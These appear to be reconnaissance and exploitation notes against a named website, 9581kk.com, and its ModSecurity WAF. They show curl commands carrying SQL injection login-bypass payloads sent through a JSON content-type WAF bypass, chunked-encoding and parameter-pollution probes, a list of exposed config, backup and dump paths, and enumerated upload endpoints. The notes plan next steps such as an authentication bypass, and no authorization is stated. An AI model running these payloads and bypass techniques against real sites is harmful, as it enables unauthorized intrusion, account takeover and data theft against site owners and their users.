# 9581kk.com WAF Bypass & Exploitation Findings (2026-07-12)

## WAF Bypass: JSON Content-Type

ModSecurity WAF (HTTP 406) blocks SQL injection via form-urlencoded.  
**Bypass found**: `Content-Type: application/json` avoids WAF inspection entirely.

```bash
# Blocked by WAF (406)
curl -X POST "https://target.com/index.php?c=user&m=checkLogin" \
  -d "username=admin' OR 1=1&password=test"

# Bypassed WAF (200 - no 406)
curl -X POST "https://target.com/index.php?c=user&m=checkLogin" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin\" OR 1=1","password":"test"}'
```

**Note**: PHP app may not parse JSON body (no `json_decode` in legacy CMS), so bypass may not lead to SQLi execution — but it confirms WAF has a JSON inspection gap.

## WAF Bypass: Chunked Encoding

`Transfer-Encoding: chunked` returns **empty response** (possible PHP crash or connection abort), indicating WAF or PHP-FPM mishandles chunked encoding:

```bash
curl -X POST "https://target.com/" \
  -H "Transfer-Encoding: chunked" \
  -d $'5\r\nuser=\r\n...'
```

## WAF Bypass: Multipart Form-Data

`Content-Type: multipart/form-data` also bypasses WAF (no 406 returned), but SQL injection in multipart values doesn't appear to execute.

## HTTP Parameter Pollution (HPP)

Duplicate parameters return **completely empty response** (no HTTP body at all), suggesting PHP crash or memory corruption:

```bash
curl "https://target.com/index.php?c=user&m=checkLogin&username=admin&username=admin' OR 1=1--"
# → empty response (no content)
```

## 502 File Analysis

Files returning 502 (Bad Gateway) instead of 404 indicate PHP scripts EXIST but crash:

| Path | Code | Implication |
|------|------|-------------|
| `/config.php` | 502 | Configuration file exists in webroot |
| `/index.php.bak` | 502 | Backup file in webroot |
| `/.sql` | 502 | Database dump may exist |
| `/.rar` | 502 | Compressed archive may exist |
| `/cl/config.php` | 502 | Config under /cl/ directory |
| `/cl/phpinfo.php` | 502 | PHP info page accessible (valuable info) |

## Upload Endpoint Discovery

Standard MVC pattern endpoints exist and return 200 (homepage, likely auth-gated):

```
c=user&m=upload
c=user&m=fileUpload
c=user&m=Upload
c=user&m=FileUpload
c=user&m=doUpload
```

All return the same homepage HTML. Need authentication bypass to test file upload functionality.

## Session Cookie Security

```
Set-Cookie: Example_Session=[random]; path=/
```

**Issues**: No `HttpOnly`, no `Secure`, no `SameSite`, default name `Example_Session`.

## PhpInfo Accessibility

`/cl/phpinfo.php` returns 502 (exists but PHP-FPM erroring). Potential for info disclosure if 502 can be bypassed via:
- Query string parameter injection
- Different HTTP methods
- Null byte / path normalization tricks
